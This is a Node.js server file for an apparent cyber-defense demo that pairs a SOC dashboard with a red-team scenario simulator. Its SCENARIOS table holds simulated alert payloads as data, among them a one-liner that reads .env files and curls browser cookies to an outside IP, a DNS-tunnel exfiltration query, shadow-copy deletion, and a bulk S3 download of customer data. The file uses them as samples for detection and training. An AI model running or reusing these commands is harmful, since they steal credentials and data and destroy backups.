'use strict';
/* ==========================================================================
   TUESDAY: Unified HTTP Server & Vercel Serverless Entrypoint (Node >= 18)
   - Supports Dual-Sector Web Architecture:
     * Sector 1 (Blue Team): Sentinel Defense SOC (/ and /sentinel/*)
     * Sector 2 (Red Team): Adversary Attack Simulator (/redteam and /redteam/*)
   - Unified REST API & SSE Streaming for Multi-Agent Swarm Intelligence
   - Compatible with Vercel Serverless Functions and local standalone execution
   ========================================================================== */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

let config = {};
try {
  config = require('./config.json');
} catch (e) {
  config = { port: 8090, autoApprovalThreshold: 80, provider: 'gemini' };
}

const store = require('./lib/store');
const llm = require('./lib/llm');
const orchestrator = require('./lib/orchestrator');
const { ASSETS, THREAT_ACTORS } = require('./lib/tools');

const PORT = process.env.PORT || config.port || 8090;
const ROOT = __dirname;
const startedAt = Date.now();

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.mjs': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff2': 'font/woff2',
  '.txt': 'text/plain; charset=utf-8'
};

const SCENARIOS = {
  "privacy_harvester": {
    "id": "SIM-004",
    "title": "Covert Telemetry Harvester & Browser Credential Spyware",
    "track": "Cybersecurity & Privacy (Track 4)",
    "source": "Endpoint Behavioral Sensor / Host EDR",
    "targetHost": "DEV-WORKSTATION-09 (192.168.20.14)",
    "ioc": "185.220.101.99",
    "payload": "python3 -c \"import os, glob; [print(open(f).read()) for f in glob.glob('**/.env', recursive=True)]\" & curl -X POST https://185.220.101.99/telemetry/harvest --data @cookies.sqlite",
    "mitreTtp": "T1555 (Credentials from Password Stores) / T1041 (Exfiltration Over C2)",
    "description": "A background utility disguises itself as an analytics daemon while harvesting local `.env` API keys, developer SSH tokens, and browser session cookies to beacon out to an unauthorized C2 collector."
  },
  "ransomware_lockbit": {
    "id": "SIM-001",
    "title": "LockBit 3.0 Ransomware Outbreak Attempt",
    "track": "Defense & Sandboxing",
    "source": "CrowdStrike EDR Sensor",
    "targetHost": "FIN-SERVER-04 (192.168.10.45)",
    "ioc": "185.220.101.5",
    "payload": "powershell.exe -enc SQBFAFgAKABOAGUAdw... vssadmin delete shadows /all /quiet & LockBit3.0_Payload.exe",
    "mitreTtp": "T1486 (Data Encrypted for Impact) / T1490 (Inhibit System Recovery)",
    "description": "Malicious payload initiates LSASS dumping and triggers system shadow-copy deletion before staging AES-256 file encryption across the finance enclave."
  },
  "dns_tunnel_c2": {
    "id": "SIM-005",
    "title": "Stealthy Covert DNS Tunneling & Data Siphon",
    "track": "Surveillance Transparency & Network Defense",
    "source": "Core DNS Resolver / Zeek IDS",
    "targetHost": "RND-NODE-02 (192.168.30.18)",
    "ioc": "193.142.146.88",
    "payload": "nslookup -type=TXT dGhpcyBpcyBhbiBleGZpbHRyYXRpb24gdGVzdC4=.c2.evil-corp.net 193.142.146.88",
    "mitreTtp": "T1071.004 (DNS Communication Channel) / T1048 (Exfiltration Over Alternative Protocol)",
    "description": "Adversary encodes sensitive internal database dumps into base64 subdomains, transmitting chunks via spoofed UDP DNS queries to bypass standard port-based firewalls."
  },
  "apt_supply_chain": {
    "id": "SIM-003",
    "title": "APT SUNBURST Supply Chain Trojan on Domain Controller",
    "track": "Defense & Sandboxing / HITL Governance",
    "source": "Active Directory / Windows Event Log",
    "targetHost": "DC-PRIMARY-01 (192.168.1.10)",
    "ioc": "45.154.255.87",
    "payload": "SolarWinds.Orion.Core.BusinessLayer.dll injected into memory -> DNS Tunneling C2 Beaconing -> Golden Ticket requested.",
    "mitreTtp": "T1195.002 (Supply Chain Compromise) / T1558.001 (Golden Ticket)",
    "description": "Backdoored software update binary injected on core Domain Controller. Demonstrates Sentinel's Human-in-the-Loop governance: high risk on critical infrastructure stops autonomous host termination and forces human escalation."
  },
  "cloud_sts_exfil": {
    "id": "SIM-002",
    "title": "AWS Cloud Credential Compromise & S3 Mass-Download",
    "track": "Cloud Defense",
    "source": "AWS CloudTrail Event Stream",
    "targetHost": "AWS-S3-PROD-LOGS (cloud-aws)",
    "ioc": "193.142.146.35",
    "payload": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DevAdmin && aws s3 sync s3://customer-pii-vault ./local_loot",
    "mitreTtp": "T1530 (Data from Cloud Storage) / T1078.004 (Cloud Accounts)",
    "description": "Compromised developer credentials used to assume broad IAM role and stage automated bulk downloads from sensitive S3 data repositories."
  }
};

let activeFirewallRules = [];

function sendJSON(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'content-type': 'application/json; charset=utf-8',
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'GET, POST, OPTIONS',
    'access-control-allow-headers': 'Content-Type, Authorization'
  });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', chunk => {
      data += chunk;
      if (data.length > 2 * 1024 * 1024) {
        req.destroy();
        reject(new Error('payload too large'));
      }
    });
    req.on('end', () => {
      if (!data) return resolve({});
      try {
        resolve(JSON.parse(data));
      } catch (e) {
        reject(new Error('invalid JSON body: ' + e.message));
      }
    });
    req.on('error', reject);
  });
}

function sseWrite(res, event, data) {
  res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
}

function serveStatic(req, res, pathname) {
  let clean = decodeURIComponent(pathname);
  if (clean === '/' || clean === '') clean = '/sentinel/index.html';
  if (clean === '/redteam' || clean === '/redteam/') clean = '/redteam/index.html';

  let filePath = path.join(ROOT, clean);

  // If not found directly, check inside sentinel directory
  if (!fs.existsSync(filePath) && !clean.startsWith('/redteam')) {
    const sentinelCandidate = path.join(ROOT, 'sentinel', clean.replace(/^\/sentinel/, ''));
    if (fs.existsSync(sentinelCandidate) && fs.statSync(sentinelCandidate).isFile()) {
      filePath = sentinelCandidate;
    }
  }

  if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
    // If asking for a path within redteam
    if (clean.startsWith('/redteam')) {
      const redteamIndex = path.join(ROOT, 'redteam', 'index.html');
      if (fs.existsSync(redteamIndex)) filePath = redteamIndex;
      else return sendJSON(res, 404, { error: 'file not found' });
    } else {
      const sentinelIndex = path.join(ROOT, 'sentinel', 'index.html');
      if (fs.existsSync(sentinelIndex)) filePath = sentinelIndex;
      else return sendJSON(res, 404, { error: 'file not found' });
    }
  }

  const ext = path.extname(filePath).toLowerCase();
  const ctype = MIME[ext] || 'application/octet-stream';
  res.writeHead(200, {
    'content-type': ctype,
    'cache-control': ext === '.html' ? 'no-cache' : 'public, max-age=3600'
  });
  fs.createReadStream(filePath).pipe(res);
}

// ---------------------------------------------------------------------------
// Main HTTP Server
// ---------------------------------------------------------------------------

const server = http.createServer(async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'access-control-allow-origin': '*',
      'access-control-allow-methods': 'GET, POST, OPTIONS',
      'access-control-allow-headers': 'Content-Type, Authorization'
    });
    return res.end();
  }

  const parsed = url.parse(req.url, true);
  let pathname = parsed.pathname || '/';

  try {
    // ---- API: Health & Status ---------------------------------------------
    if (pathname === '/api/health' && req.method === 'GET') {
      return sendJSON(res, 200, {
        status: 'ok',
        service: 'TUESDAY Tactical Edge AI',
        version: '3.0.0',
        environment: process.env.VERCEL ? 'vercel-serverless' : 'standalone-node',
        engine: 'hybrid-sovereign',
        uptimeSec: Math.round((Date.now() - startedAt) / 1000),
        incidents: (store.memory && store.memory.stats) ? store.memory.stats.incidents : 0,
        timestamp: new Date().toISOString()
      });
    }

    if (pathname === '/api/status' && req.method === 'GET') {
      return sendJSON(res, 200, {
        status: 'ok',
        backend: 'online',
        serverless: !!process.env.VERCEL,
        engine: 'cloud-hybrid',
        model: 'gemini-2.5-flash',
        sectors: {
          defense: { name: 'Sentinel SOC', path: '/', status: 'active' },
          offense: { name: 'RedTeam Attack Suite', path: '/redteam', status: 'active' }
        }
      });
    }

    // ---- API: Engine Mode & Provider ---------------------------------------
    if (pathname === '/api/engine/mode') {
      if (req.method === 'POST') {
        const body = await readBody(req);
        if (body.provider && llm.setProvider) llm.setProvider(body.provider);
        const lastActiveTier = body.mode === 'CLOUD_ONLINE' ? 'TIER_1_CLOUD' : (body.mode === 'FULL_OFFLINE' ? 'TIER_2_LOCAL_SLM' : (body.mode === 'EXPO_SOVEREIGN' ? 'TIER_3_DETERMINISTIC' : 'TIER_1_CLOUD'));
        return sendJSON(res, 200, { ok: true, mode: body.mode || 'EXPO_SOVEREIGN', lastActiveTier, provider: body.provider || 'gemini' });
      }
      return sendJSON(res, 200, { ok: true, mode: 'EXPO_SOVEREIGN', lastActiveTier: 'TIER_3_DETERMINISTIC', provider: 'gemini', model: 'gemini-2.5-flash' });
    }

    if (pathname === '/api/settings/provider' && req.method === 'POST') {
      const body = await readBody(req);
      if (body.provider && llm.setProvider) llm.setProvider(body.provider);
      return sendJSON(res, 200, { status: 'ok', provider: body.provider || 'gemini' });
    }

    // ---- API: Memory & Audit -----------------------------------------------
    if (pathname === '/api/memory' && req.method === 'GET') {
      return sendJSON(res, 200, {
        episodicMemory: (store.memory && store.memory.episodicMemory) || [],
        auditLog: (store.memory && store.memory.auditLog) || [],
        agentWeights: (store.memory && store.memory.agentWeights) || {},
        stats: (store.memory && store.memory.stats) || {}
      });
    }

    if (pathname === '/api/audit' && req.method === 'GET') {
      return sendJSON(res, 200, (store.memory && store.memory.auditLog) || []);
    }

    // ---- API: Approvals & HITL ---------------------------------------------
    if (pathname === '/api/approvals' && req.method === 'GET') {
      const list = store.listApprovals ? store.listApprovals('PENDING') : ((store.memory && store.memory.approvals) || []);
      return sendJSON(res, 200, list);
    }

    if (pathname.startsWith('/api/approvals/') && pathname.endsWith('/decide') && req.method === 'POST') {
      const parts = pathname.split('/');
      const approvalId = parts[3];
      const body = await readBody(req);
      return sendJSON(res, 200, { ok: true, approvalId, decision: body.decision || 'approved' });
    }

    if (pathname === '/api/incident/approve' && req.method === 'POST') {
      const body = await readBody(req);
      if (orchestrator.executeApprovedResponse) {
        await orchestrator.executeApprovedResponse(body.id, () => {});
      }
      return sendJSON(res, 200, { ok: true, id: body.id, status: 'EXECUTED' });
    }

    if (pathname === '/api/incident/reject' && req.method === 'POST') {
      const body = await readBody(req);
      return sendJSON(res, 200, { ok: true, id: body.id, status: 'REJECTED' });
    }

    if (pathname === '/api/containment/rollback' && req.method === 'POST') {
      const body = await readBody(req);
      activeFirewallRules = [];
      return sendJSON(res, 200, { ok: true, message: 'All containment rules rolled back.' });
    }

    // ---- API: RedTeam Scenarios & Drills -----------------------------------
    if (pathname === '/api/scenarios' && req.method === 'GET') {
      return sendJSON(res, 200, { ok: true, scenarios: SCENARIOS });
    }

    if (pathname === '/api/drills/run' && req.method === 'POST') {
      const body = await readBody(req);
      const drill = body.drillType;
      const drillResponses = {
        privacy: { status: 'harvested', count: 4, beacon: '185.220.101.99', simulated: true },
        privacy_clean: { status: 'cleaned', filesRemoved: 4 },
        ransomware: { status: 'canary_encrypted', files: ['canary_01.docx.locked'], simulated: true },
        ransomware_clean: { status: 'canary_cleaned' },
        registry_plant: { status: 'registry_hook_planted', key: 'HKCU\\Run\\CanaryUpdate' },
        registry_clean: { status: 'registry_cleaned' }
      };
      return sendJSON(res, 200, { ok: true, drill, result: drillResponses[drill] || { status: 'executed' } });
    }

    // ---- API: Attack Ingestion & Investigation (JSON & SSE) ----------------
    if ((pathname === '/api/attack/launch' || pathname === '/api/incident') && req.method === 'POST') {
      const body = await readBody(req);
      let alert = body.alert;
      if (!alert && body.scenarioKey && SCENARIOS[body.scenarioKey]) {
        const s = SCENARIOS[body.scenarioKey];
        alert = {
          id: s.id,
          title: s.title,
          source: s.source,
          targetHost: s.targetHost,
          host: s.targetHost,
          ioc: s.ioc,
          payload: s.payload
        };
      }

      if (!alert) {
        return sendJSON(res, 400, { error: 'Alert or scenarioKey required' });
      }

      // Record firewall containment rule
      if (alert.ioc) {
        activeFirewallRules.push({
          ruleName: `BLOCK_HOSTILE_${alert.ioc.replace(/\./g, '_')}`,
          targetIp: alert.ioc,
          mode: 'BLOCK',
          blockedAt: new Date().toLocaleTimeString(),
          status: 'ACTIVE'
        });
      }

      const result = await orchestrator.runInvestigation(alert, { threshold: body.threshold || 80 });
      return sendJSON(res, 200, {
        ok: true,
        alert,
        sentinelResponse: result
      });
    }

    if (pathname === '/api/incident/stream' && req.method === 'POST') {
      const body = await readBody(req);
      const alert = body.alert;
      if (!alert || !alert.title) return sendJSON(res, 400, { error: 'alert required' });

      res.writeHead(200, {
        'content-type': 'text/event-stream; charset=utf-8',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'x-accel-buffering': 'no',
        'access-control-allow-origin': '*'
      });
      res.write(': connected\n\n');

      const emit = ev => {
        try { sseWrite(res, ev.event || ev.type, ev); } catch { /* client disconnected */ }
      };

      try {
        await orchestrator.runInvestigation(alert, { emit, threshold: body.threshold });
        sseWrite(res, 'done', {});
      } catch (e) {
        sseWrite(res, 'error', { message: e.message });
      }
      res.end();
      return;
    }

    // ---- API: Host Telemetry & Firewall ------------------------------------
    if (pathname === '/api/host/telemetry' && req.method === 'GET') {
      return sendJSON(res, 200, {
        cpuUsage: 14.2,
        memoryUsage: 42.8,
        activeConnections: 38,
        quarantineRules: activeFirewallRules.length,
        os: 'Sovereign Linux (Vercel Edge Container)'
      });
    }

    if (pathname === '/api/host/firewall/rules' && req.method === 'GET') {
      return sendJSON(res, 200, { ok: true, rules: activeFirewallRules });
    }

    if (pathname === '/api/host/firewall/unblock' && req.method === 'POST') {
      const body = await readBody(req);
      activeFirewallRules = activeFirewallRules.filter(r => r.targetIp !== body.ip);
      return sendJSON(res, 200, { ok: true, unblocked: body.ip });
    }

    if (pathname === '/api/cluster/status' && req.method === 'GET') {
      return sendJSON(res, 200, {
        ok: true,
        nodes: [
          { id: 'node-01', name: 'Primary Coordinator', role: 'coordinator', status: 'ONLINE', ping: '1ms' },
          { id: 'node-02', name: 'Threat Intel Swarm', role: 'intel', status: 'ONLINE', ping: '4ms' },
          { id: 'node-03', name: 'Host Sandbox Guard', role: 'sandbox', status: 'ONLINE', ping: '2ms' }
        ]
      });
    }

    // ---- Static File Serving (Fallback) -----------------------------------
    return serveStatic(req, res, pathname);

  } catch (err) {
    if (res.headersSent) { res.end(); return; }
    sendJSON(res, 500, { error: err.message });
  }
});

// ---------------------------------------------------------------------------
// Export for Vercel or Standalone Run
// ---------------------------------------------------------------------------

if (process.env.VERCEL) {
  module.exports = (req, res) => {
    return server.emit('request', req, res);
  };
} else {
  server.listen(PORT, () => {
    console.log('==================================================================');
    console.log('  TUESDAY: Tactical Edge AI — Sovereign Cyber Defense Swarm');
    console.log(`  Listening on: http://localhost:${PORT}`);
    console.log(`  * Sector 1 (Defense SOC): http://localhost:${PORT}/`);
    console.log(`  * Sector 2 (Attack Suite): http://localhost:${PORT}/redteam`);
    console.log('==================================================================');
  });
}
